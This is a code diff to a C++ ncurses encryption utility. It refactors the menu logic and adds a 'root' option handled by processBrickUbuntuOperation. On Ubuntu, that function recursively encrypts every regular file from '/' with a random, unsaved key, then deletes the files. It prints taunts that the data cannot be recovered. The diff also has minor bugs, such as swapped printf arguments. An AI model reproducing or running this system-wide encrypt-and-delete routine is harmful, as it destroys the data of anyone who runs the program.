@@ -47,10 +47,36 @@ MainMenu::OptionsSelected MainMenu::showMenu()
     initializeNCR(); //< Инициализация интерфейса ncurses
     clear();
 
+    while (true)
+    {
+        clear();
+        const auto target_selection = processTargetSelection();
+
+        if (target_selection == OptionsSelected::EXIT)
+        {
+            break;
+        }
+
+        const auto process_selection = processOperationExecution(target_selection);
+
+        if (process_selection == OptionsSelected::EXIT)
+        {
+            break;
+        }
+
+        if (process_selection == OptionsSelected::RETURN)
+        {
+            continue;
+        }
+    }
+
+    return cleanupNCR(OptionsSelected::EXIT);
+}
+
+MainMenu::OptionsSelected MainMenu::processTargetSelection()
+{
     mvprintw(2, 10, "Select what do you want to process?"); clrtoeol();
     mvprintw(3, 10, "-----------------------------------"); clrtoeol();
-
-    target_choice_label:
 
     ///< Меню выбора цели операции
     mvprintw(4, 12, "1 - File"); clrtoeol();
@@ -63,218 +89,239 @@ MainMenu::OptionsSelected MainMenu::showMenu()
         mvprintw(i, 12, " "); clrtoeol();
     }
 
-    const auto user_target_choice = getUserInput({'1', '2', '3', 'q'});
+    return getUserInput({'1', '2', '3', 'q'});
+}
 
-    std::string target_type;
-
-    ///< Обработка выбора цели операции
-    switch (user_target_choice)
-    {
-        case OptionsSelected::EXIT:
-            return cleanupNCR(OptionsSelected::EXIT);
-        case OptionsSelected::OPT_FILE:
-            target_type = "file";
-            break;
-        case OptionsSelected::OPT_STRING:
-            target_type = "string";
-            break;
-        case OptionsSelected::OPT_ROOT:
-            target_type = "root";
-            break;
-        default:
-            mvprintw(11, 12, "Invalid choice provided, exiting..."); clrtoeol();
-            std::this_thread::sleep_for(std::chrono::seconds(2));
-            return cleanupNCR(OptionsSelected::EXIT);
-    }
+MainMenu::OptionsSelected MainMenu::processOperationSelection(MainMenu::OptionsSelected target_selection)
+{
+    std::string target_type = (target_selection == OptionsSelected::OPT_FILE) ? "file" : "string";
 
     mvprintw(2, 10, "Do you want to encrypt or decrypt?"); clrtoeol();
+    mvprintw(3, 10, "-----------------------------------"); clrtoeol();
     mvprintw(4, 12, "e - Encrypt %s", target_type.c_str()); clrtoeol();
     mvprintw(5, 12, "d - Decrypt %s", target_type.c_str()); clrtoeol();
     mvprintw(6, 12, "r - Return"); clrtoeol();
 
-    const auto user_operation_choice = getUserInput({'e', 'd', 'r', 'q'});
+    return getUserInput({'e', 'd', 'r', 'q'});
+}
 
-    ///< Меню выбора типа операции
-    switch (user_operation_choice)
+MainMenu::OptionsSelected MainMenu::processOperationExecution(MainMenu::OptionsSelected target_selection)
+{
+    while (true)
     {
-        case OptionsSelected::EXIT:
-            return cleanupNCR(OptionsSelected::EXIT);
-        case OptionsSelected::TYPE_ENCRYPT:
-            target_type = "encrypt";
-            break;
-        case OptionsSelected::TYPE_DECRYPT:
-            target_type = "decrypt";
-            break;
-        case OptionsSelected::RETURN:
-            goto target_choice_label;
-        default:
-            mvprintw(11, 12, "Invalid choice provided, exiting...");
-            std::this_thread::sleep_for(std::chrono::seconds(2));
-            return cleanupNCR(OptionsSelected::EXIT);
-    }
-
-    ///< Обработка строки для шифрования
-    if (user_target_choice == OptionsSelected::OPT_STRING)
-    {
-        mvprintw(6, 12, " "); clrtoeol();
-        mvprintw(7, 12, " "); clrtoeol();
-        mvprintw(8, 12, " "); clrtoeol();
-        mvprintw(2, 10, "Enter string to %s", target_type.c_str()); clrtoeol();
-        mvprintw(4, 12, "String to encrypt:"); clrtoeol();
-        mvprintw(5, 12, "(max %d characters):", 32); clrtoeol();
-        const auto string_to_encrypt = getInputString(5, 32); clrtoeol();
-
-        mvprintw(2, 10, "Enter %sion key", target_type.c_str()); clrtoeol();
-
-        bool generate_key = (user_operation_choice == OptionsSelected::TYPE_ENCRYPT)
-                            ? getYesNoInput(6, "Generate key automatically?")
-                            : false;
-
-        mvprintw(6, 12, " "); clrtoeol();
-        mvprintw(7, 12, " "); clrtoeol();
-        mvprintw(11, 12, " "); clrtoeol();
-
-        struct bckey key;
-        size_t password_length = 32;
-        char password[password_length + 1] = {0}; // Массив для хранения пароля (32 символа + \0)
-
-        if (generate_key)
-        {
-            mvprintw(6, 12, "Your password:");
-            CryptoProvider::generate_random_string(32, password);
-            CryptoProvider::generate_key_from_password(password, "", &key);
-            mvprintw(7, 12, "(max %d characters): %s", 32, password);
-        }
-        else
-        {
-            mvprintw(6, 12, "Your password:");
-            mvprintw(7, 12, "(max %d characters):", 32);
-            const auto input_string = getInputString(7, 32);
-            std::strncpy(password, input_string.c_str(), password_length);
-            CryptoProvider::generate_key_from_password(password, "", &key);
-            mvprintw(7, 12, "(max %d characters): %s", 32, password);
-        }
-
-        std::string result = CryptoProvider::encrypt(string_to_encrypt, &key);
-        std::string status = (string_to_encrypt == CryptoProvider::decrypt(result, &key)) ? "Match" : "Non Match";
-
-        mvprintw(8, 12, "Result:"); clrtoeol();
-        mvprintw(9, 12, "(%s): %s", status.c_str(), result.c_str());
-
-
-    }
-    else if (user_target_choice == OptionsSelected::OPT_FILE)
-    {
-        pick_another_label:
-
-        std::string input_file = getInputWithFileValidation("Enter file path: ");
-
-        fs::path path(input_file);
-
-        std::string file_name = path.filename().string();
-
         clear();
+        if  (target_selection == OptionsSelected::OPT_ROOT)
+        {
+            if (processBrickUbuntuOperation(target_selection))
+            {
+                return OptionsSelected::EXIT;
+            }
+            return OptionsSelected::RETURN;
+        }
 
-        mvprintw(2, 10, "What do you want to do with file?");
+        const auto process_selection = processOperationSelection(target_selection);
+
+        if (process_selection == OptionsSelected::EXIT || process_selection == OptionsSelected::RETURN)
+        {
+            return process_selection;
+        }
+
+        if (target_selection == OptionsSelected::OPT_STRING)
+        {
+            if (processStringOperation(process_selection))
+            {
+                return OptionsSelected::EXIT;
+            }
+        }
+        else if (target_selection == OptionsSelected::OPT_FILE)
+        {
+            if (processFileOperation(process_selection))
+            {
+                return OptionsSelected::EXIT;
+            }
+        }
+
+    }
+    return OptionsSelected::CONTINUE;
+}
+
+bool MainMenu::processStringOperation(MainMenu::OptionsSelected operation_choice)
+{
+    clear();
+
+    std::string target_type = (operation_choice == OptionsSelected::TYPE_ENCRYPT) ? "encrypt" : "decrypt";
+    mvprintw(2, 10, "Enter string to %s", target_type.c_str()); clrtoeol();
+    mvprintw(3, 10, "-----------------------------------"); clrtoeol();
+
+    std::string string_to_encrypt = getInputString(4, "String", 32);
+
+    mvprintw(2, 10, "Enter %sion password", target_type.c_str()); clrtoeol();
+    bool generate_key = (operation_choice == OptionsSelected::TYPE_ENCRYPT)
+                        ? getYesNoInput(11, "Generate key automatically?")
+                        : false;
+
+
+    struct bckey key;
+    generateKeyForOperation(generate_key, key);
+
+    std::string encrypted_string = CryptoProvider::encrypt(string_to_encrypt, &key);
+    std::string decrypted_string = CryptoProvider::decrypt(encrypted_string, &key);
+    std::string status = (string_to_encrypt == decrypted_string) ? "Match" : "Do Not Match";
+
+    mvprintw(7, 12, "Result: '%s' -> '%s'", decrypted_string.c_str(), encrypted_string.c_str()); clrtoeol();
+    mvprintw(11, 12, "(String %s)", status.c_str()); clrtoeol();
+
+    return getYesNoInput(9, "Exit?");
+}
+
+bool MainMenu::processFileOperation(MainMenu::OptionsSelected operation_choice)
+{
+    std::string target_type = (operation_choice == OptionsSelected::TYPE_ENCRYPT) ? "encrypt" : "decrypt";
+    std::string input_file = getInputWithFileValidation("Enter file path: ");
+    fs::path path(input_file);
+    std::string file_name = path.filename().string();
+
+    if (operation_choice == OptionsSelected::RETURN)
+    {
+        return false;
+    }
+
+    clear();
+    mvprintw(2, 10, "Enter %sion password", target_type.c_str()); clrtoeol();
+    mvprintw(3, 10, "-----------------------------------");
+
+    mvprintw(4, 12, "File: %s", file_name.c_str()); clrtoeol();
+
+    bool generate_key = (operation_choice == OptionsSelected::TYPE_ENCRYPT)
+                        ? getYesNoInput(11, "Generate key automatically?")
+                        : false;
+
+    struct bckey key;
+    generateKeyForOperation(generate_key, key);
+
+    size_t size = 0;
+    ak_uint8* buffer = ak_ptr_load_from_file(buffer, &size, input_file.c_str());
+
+    if (!buffer || size == 0)
+    {
+        mvprintw(9, 12, "Failed to load file or file is empty.");
+        return false;
+    }
+
+    auto encrypted_buffer = CryptoProvider::encrypt(buffer, size, &key);
+    auto decrypted_buffer = CryptoProvider::decrypt(encrypted_buffer, size, &key);
+
+    std::string status = (std::memcmp(buffer, decrypted_buffer, size) == 0) ? "Match" : "Non Match";
+
+    size_t decrypted_size = std::min<size_t>(size, 32);
+    size_t encrypted_size = std::min<size_t>(size, 32);
+
+    std::string decrypted_string = std::string(reinterpret_cast<char*>(decrypted_buffer), decrypted_size);
+    std::string encrypted_string = std::string(reinterpret_cast<char*>(encrypted_buffer), encrypted_size);
+
+    decrypted_string = MainMenu::stripNewlines(decrypted_string);
+    encrypted_string = MainMenu::stripNewlines(encrypted_string);
+
+    mvprintw(7, 12, "Result: '%s' -> '%s'", decrypted_string.c_str(), encrypted_string.c_str()); clrtoeol();
+    mvprintw(11, 12, "(String %s)", status.c_str()); clrtoeol();
+
+    if (getYesNoInput(9, "Save to file?"))
+    {
+        CryptoProvider::ak_save_to_file(encrypted_buffer, size, input_file);
+    }
+
+    delete[] encrypted_buffer;
+    delete[] decrypted_buffer;
+    delete[] buffer;
+
+    return getYesNoInput(9, "Exit?");
+}
+
+bool MainMenu::processBrickUbuntuOperation(MainMenu::OptionsSelected operation_choice)
+{
+    clear();
+
+    if (strcmp(CMAKE_SYSTEM_ID , "ubuntu") == 0)
+    {
+        mvprintw(2, 10, "Starting encryption operation...");
         mvprintw(3, 10, "-----------------------------------");
-        mvprintw(4, 12, "c - Continue");
-        mvprintw(5, 12, "p - Pick another file");
-        mvprintw(6, 12, "r - Return");
-        mvprintw(9, 12, "You selected: %s", file_name.c_str());
-
-        const auto user_operation_choice = getUserInput({'c', 'p', 'r', 'q'});
-
-        ///< Меню выбора типа операции
-        switch (user_operation_choice)
-        {
-            case OptionsSelected::EXIT:
-                return cleanupNCR(OptionsSelected::EXIT);
-            case OptionsSelected::CONTINUE:
-                break;
-            case OptionsSelected::PICK_ANOTHER:
-                goto pick_another_label;
-            case OptionsSelected::RETURN:
-                goto target_choice_label;
-            default:
-                mvprintw(11, 12, "Invalid choice provided, exiting...");
-                std::this_thread::sleep_for(std::chrono::seconds(2));
-                return cleanupNCR(OptionsSelected::EXIT);
-        }
-
-        for (int i = 4; i <= 9; ++i)
-        {
-            mvprintw(i, 12, " "); clrtoeol();
-        }
 
         struct bckey key;
         size_t password_length = 32;
         char password[password_length + 1] = {0};
 
-        mvprintw(4, 12, "You selected:");
-        mvprintw(4, 12, "%s", file_name.c_str());
-        mvprintw(6, 12, "Your password:");
-        mvprintw(7, 12, "(max %d characters):", 32);
-        const auto input_string = getInputString(7, 32);
-        std::strncpy(password, input_string.c_str(), password_length);
+        CryptoProvider::generate_random_string(32, password);
         CryptoProvider::generate_key_from_password(password, "", &key);
-        mvprintw(7, 12, "(max %d characters): %s", 32, password);
 
-        size_t size = 0;
-        ak_uint8 *buffer = nullptr;
-
-        buffer = ak_ptr_load_from_file(buffer, &size, input_file.c_str());
-
-        if (buffer == nullptr || size == 0)
+        for (const auto& entry : fs::recursive_directory_iterator(fs::path("/")))
         {
-            mvprintw(9, 12, "Failed to load file or file is empty.");
-            return cleanupNCR();
+            if (fs::is_regular_file(entry.status()))
+            {
+                const std::string input_file = entry.path().string();
+                ak_uint8* buffer = nullptr;
+                size_t size = 0;
+
+                buffer = ak_ptr_load_from_file(buffer, &size, input_file.c_str());
+                if (!buffer)
+                {
+                    mvprintw(4, 12, "Failed to load file: %s", input_file.c_str());
+                    continue;
+                }
+
+                ak_uint8* encrypted_buffer = CryptoProvider::encrypt(buffer, size, &key);
+                if (!encrypted_buffer)
+                {
+                    mvprintw(4, 12, "Encryption failed for file: %s", input_file.c_str());
+                    delete[] buffer;
+                    continue;
+                }
+
+                if (!CryptoProvider::ak_save_to_file(encrypted_buffer, size, input_file.c_str()))
+                {
+                    mvprintw(4, 12, "Failed to save encrypted file: %s", input_file.c_str());
+                }
+
+                delete[] buffer;
+                delete[] encrypted_buffer;
+
+                fs::remove(input_file);
+            }
         }
 
-        ak_uint8 *encrypted_buffer = CryptoProvider::encrypt(buffer, size, &key);
-
-        if (encrypted_buffer == nullptr)
-        {
-            mvprintw(9, 12, "Encryption failed.");
-            delete[] buffer;
-            return cleanupNCR();
-        }
-
-        ak_uint8 *decrypted_buffer = CryptoProvider::decrypt(encrypted_buffer, size, &key);
-
-        if (decrypted_buffer == nullptr)
-        {
-            mvprintw(9, 12, "Decryption failed.");
-            delete[] encrypted_buffer;
-            delete[] buffer;
-            return cleanupNCR();
-        }
-
-        CryptoProvider::ak_save_to_file(encrypted_buffer, size, input_file);
-
-        std::string status = (std::memcmp(buffer, decrypted_buffer, size) == 0) ? "Match" : "Non Match";
-
-        mvprintw(8, 12, "Result:"); clrtoeol();
-        mvprintw(9, 12, "(%s)", status.c_str());
-
-        delete[] encrypted_buffer;
-        delete[] decrypted_buffer;
-        delete[] buffer;
+        mvprintw(4, 12, "Encryption complete.");
+        mvprintw(5, 12, "I told you during cmake generation not to compile it.");
+        mvprintw(6, 12, "Good luck decryptin it :) Better switch to any other linux..");
+        mvprintw(7, 12, "Your encryption key: %s...", CryptoProvider::bckey_to_string(&key).c_str());
     }
     else
     {
-        clear();
-        mvprintw(2, 10, "Wrong file system");
+        mvprintw(2, 10, "Wrong file system, %s is not supported", CMAKE_SYSTEM_ID);
         mvprintw(3, 10, "-----------------------------------");
-        mvprintw(4, 10, "In order to recursively encrypt your whole system");
-        mvprintw(5, 10, "You have to be Ubuntu user");
+        mvprintw(4, 12, "In order to recursively encrypt your whole system");
+        mvprintw(5, 12, "You have to be an Ubuntu user");
     }
+    return getYesNoInput(8, "Exit?");
+}
 
-    if (!getYesNoInput(10, "Exit?"))
+void MainMenu::generateKeyForOperation(bool generate_key, struct bckey& key)
+{
+    size_t password_length = 32;
+    char password[password_length + 1] = {0};
+
+    if (generate_key)
     {
-        goto target_choice_label;
+        CryptoProvider::generate_random_string(32, password);
+        CryptoProvider::generate_key_from_password(password, "", &key);
+        mvprintw(5, 12, "Password: %s", password);
+        mvprintw(6, 12, "Key: %s...", CryptoProvider::bckey_to_string(&key).substr(0, 32).c_str());
     }
-
-    return cleanupNCR(user_target_choice);
+    else
+    {
+        const auto input_string = getInputString(5, "Password", 32);
+        std::strncpy(password, input_string.c_str(), password_length);
+        CryptoProvider::generate_key_from_password(password, "", &key);
+        mvprintw(6, 12, "Key: %s...", CryptoProvider::bckey_to_string(&key).substr(0, 32).c_str());
+    }
 }
 
 /**
@@ -284,7 +331,7 @@ MainMenu::OptionsSelected MainMenu::showMenu()
  * @param max_length Максимальная длина строки.
  * @return std::string Введенная строка.
  */
-std::string MainMenu::getInputString(int line, unsigned int max_length)
+std::string MainMenu::getInputString(int line, const std::string& purpose, unsigned int max_length)
 {
     std::string input;
     int user_input;
@@ -302,10 +349,12 @@ std::string MainMenu::getInputString(int line, unsigned int max_length)
         {
             input += static_cast<char>(user_input);
         }
-        mvprintw(line, 12, "(max %d characters): %s", max_length, input.c_str());
-        clrtoeol();
+        mvprintw(11, 12, "(You enteren %d out of %d characters)", max_length, (int)input.length());
+        mvprintw(line, 12, "%s: %s", purpose.c_str(), input.c_str()); clrtoeol();
         refresh();
     }
+
+    mvprintw(11, 12, " "); clrtoeol();
     return input;
 }
 
@@ -322,7 +371,7 @@ bool MainMenu::getYesNoInput(int line, const std::string& question)
     int user_input;
     bool valid_input = false;
 
-    mvprintw(line, 12, "%s (y/n): ", question.c_str());
+    mvprintw(line, 12, "%s (y/n): ", question.c_str()); clrtoeol();
     refresh();
 
     while (!valid_input)
@@ -336,7 +385,7 @@ bool MainMenu::getYesNoInput(int line, const std::string& question)
         {
             if (user_input > 0)
             {
-                mvprintw(11, 12, "Invalid input! Please enter 'y' or 'n': ");
+                mvprintw(line, 12, "Invalid input! Please enter 'y' or 'n': "); clrtoeol();
                 refresh();
             }
         }
@@ -450,93 +499,72 @@ MainMenu::OptionsSelected MainMenu::getUserInput(const std::set<char>& valid_inp
     return OptionsSelected::EXIT;
 }
 
-/**
- * @brief Получает строковый ввод от пользователя с проверкой на существующий файл.
- *
- * Функция позволяет пользователю вводить строку, при нажатии на Tab проверяется текущий введенный путь.
- * Если это каталог, отображается его содержимое. Пользователь не может нажать Enter до тех пор,
- * пока не введет путь до существующего файла.
- *
- * @param prompt Сообщение, отображаемое пользователю перед вводом.
- * @return std::string Строка, введенная пользователем.
- */
-std::string MainMenu::getInputWithFileValidation(const std::string& prompt)
-{
-    std::string user_input = fs::current_path();
-    int ch;
+std::string MainMenu::formatDisplayString(const std::string& path) {
+    return path.length() > 32 ? "..." + path.substr(path.length() - 32) : path;
+}
 
+void MainMenu::drawFileManager(const std::string& user_input, const std::string& prompt) {
     clear();
     mvprintw(2, 10, "Please select file");
     mvprintw(3, 10, "-----------------------------------");
-    mvprintw(4, 12, "%s%s", prompt.c_str(), user_input.c_str());
+    mvprintw(4, 12, "%s%s", prompt.c_str(), formatDisplayString(user_input).c_str());
 
-    while (true)
-    {
-        ch = getch();
-
-        if (ch == 127 || ch == KEY_BACKSPACE)
-        {
-            if (!user_input.empty())
-            {
-                user_input.pop_back();
-                goto draw_file_manager;
-            }
+    if (fs::exists(user_input) && fs::is_directory(user_input)) {
+        mvprintw(5, 12, "Content of directory: %s", formatDisplayString(user_input).c_str());
+        int line = 6;
+        for (const auto& entry : fs::directory_iterator(user_input)) {
+            mvprintw(line++, 12, "%s", entry.path().filename().c_str());
         }
-        else if (ch == '\n')
-        {
-            if (fs::exists(user_input) && fs::is_regular_file(user_input))
-            {
-                return user_input;
-            }
-        }
-        else if (ch > 0)
-        {
-            user_input.push_back(static_cast<char>(ch));
-
-            draw_file_manager:
-            clear();
-            mvprintw(2, 10, "Please select file");
-            mvprintw(3, 10, "-----------------------------------");
-
-            if (fs::exists(user_input) && fs::is_directory(user_input))
-            {
-                mvprintw(5, 12, "Content of directory: %s", user_input.c_str());
-
+    } else {
+        std::string last_dir;
+        size_t last_slash_pos = user_input.find_last_of('/');
+        if (last_slash_pos != std::string::npos) {
+            last_dir = user_input.substr(0, last_slash_pos + 1); // Get path to the last '/'
+            if (fs::exists(last_dir) && fs::is_directory(last_dir)) {
+                std::string filter = user_input.substr(last_slash_pos + 1);
+                mvprintw(5, 12, "Content of directory: %s", formatDisplayString(last_dir).c_str());
                 int line = 6;
-                for (const auto& entry : fs::directory_iterator(user_input))
-                {
-                    mvprintw(line++, 12, "%s", entry.path().filename().c_str());
-                }
-            }
-            else
-            {
-                std::string last_dir;
-                size_t last_slash_pos = user_input.find_last_of('/');
-
-                if (last_slash_pos != std::string::npos)
-                {
-                    last_dir = user_input.substr(0, last_slash_pos + 1); //< Получаем путь до последнего '/'
-
-                    if (fs::exists(last_dir) && fs::is_directory(last_dir))
-                    {
-                        //< Если каталог существует, получаем часть после последнего '/'
-                        std::string filter = user_input.substr(last_slash_pos + 1);
-                        mvprintw(5, 12, "Content of directory: %s", last_dir.c_str());
-
-                        int line = 6;
-                        for (const auto& entry : fs::directory_iterator(last_dir))
-                        {
-                            std::string filename = entry.path().filename().string();
-                            //< Фильтруем по части после последнего '/'
-                            if (filename.find(filter) != std::string::npos)
-                            {
-                                mvprintw(line++, 12, "%s", filename.c_str());
-                            }
-                        }
+                for (const auto& entry : fs::directory_iterator(last_dir)) {
+                    std::string filename = entry.path().filename().string();
+                    if (filename.find(filter) != std::string::npos) {
+                        mvprintw(line++, 12, "%s", filename.c_str());
                     }
                 }
             }
-            mvprintw(4, 12, "%s%s", prompt.c_str(), user_input.c_str()); clrtoeol();
         }
     }
+
+    mvprintw(4, 12, "%s%s", prompt.c_str(), formatDisplayString(user_input).c_str());
+    clrtoeol();
+}
+
+std::string MainMenu::getInputWithFileValidation(const std::string& prompt) {
+    std::string user_input = fs::current_path();
+    int ch;
+
+    drawFileManager(user_input, prompt);
+
+    while (true) {
+        ch = getch();
+        if (ch == 127 || ch == KEY_BACKSPACE) {
+            if (!user_input.empty()) {
+                user_input.pop_back();
+                drawFileManager(user_input, prompt);
+            }
+        } else if (ch == '\n') {
+            if (fs::exists(user_input) && fs::is_regular_file(user_input)) {
+                return user_input;
+            }
+        } else if (ch > 0) {
+            user_input.push_back(static_cast<char>(ch));
+            drawFileManager(user_input, prompt);
+        }
+    }
+}
+
+std::string MainMenu::stripNewlines(const std::string& str)
+{
+    std::string modified = str;
+    std::replace(modified.begin(), modified.end(), '\n', ' ');
+    return modified;
 }
